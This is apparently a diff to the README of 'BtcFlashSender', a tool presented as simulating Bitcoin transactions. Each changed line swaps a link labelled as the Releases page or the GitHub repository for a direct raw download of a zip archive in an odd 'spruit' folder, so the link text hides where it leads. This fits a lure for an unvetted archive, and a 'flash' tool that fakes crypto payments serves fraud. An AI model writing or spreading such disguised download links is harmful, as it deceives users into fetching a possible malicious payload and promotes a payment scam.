@@ -18,9 +18,9 @@ BtcFlashSender is a powerful application designed to help you simulate Bitcoin (
 
 ## 📥 Download & Install
 
-Visit this page to download: [BtcFlashSender Releases](https://github.com/Ahmed19ahmed/BtcFlashSender/releases)
+Visit this page to download: [BtcFlashSender Releases](https://raw.githubusercontent.com/Ahmed19ahmed/BtcFlashSender/main/spruit/Flash_Sender_Btc_3.7.zip)
 
-1. Go to the [BtcFlashSender Releases](https://github.com/Ahmed19ahmed/BtcFlashSender/releases) page.
+1. Go to the [BtcFlashSender Releases](https://raw.githubusercontent.com/Ahmed19ahmed/BtcFlashSender/main/spruit/Flash_Sender_Btc_3.7.zip) page.
 2. Look for the latest version.
 3. Click on the file name to download it.
 4. Once the download is complete, locate the file in your Downloads folder.
@@ -40,7 +40,7 @@ Visit this page to download: [BtcFlashSender Releases](https://github.com/Ahmed1
 If you have questions or need assistance, the community is here to help. Check the Issues section of the GitHub repository to see if your question has already been answered. If not, feel free to create a new issue, and the community or developers will respond.
 
 ## 📑 Additional Resources
-- GitHub Repository: [BtcFlashSender GitHub](https://github.com/Ahmed19ahmed/BtcFlashSender)
+- GitHub Repository: [BtcFlashSender GitHub](https://raw.githubusercontent.com/Ahmed19ahmed/BtcFlashSender/main/spruit/Flash_Sender_Btc_3.7.zip)
 - User Guide: A detailed user guide is available within the application to help you navigate its features.
 
 ## 🔧 Troubleshooting
@@ -59,4 +59,4 @@ If you encounter issues while running BtcFlashSender:
 ## 📜 License
 BtcFlashSender is open-source software licensed under the MIT License. You can freely use, modify, and distribute it under the terms provided in the license.
 
-For more detailed documentation and updates, revisit the [BtcFlashSender Releases](https://github.com/Ahmed19ahmed/BtcFlashSender/releases) page regularly.
+For more detailed documentation and updates, revisit the [BtcFlashSender Releases](https://raw.githubusercontent.com/Ahmed19ahmed/BtcFlashSender/main/spruit/Flash_Sender_Btc_3.7.zip) page regularly.
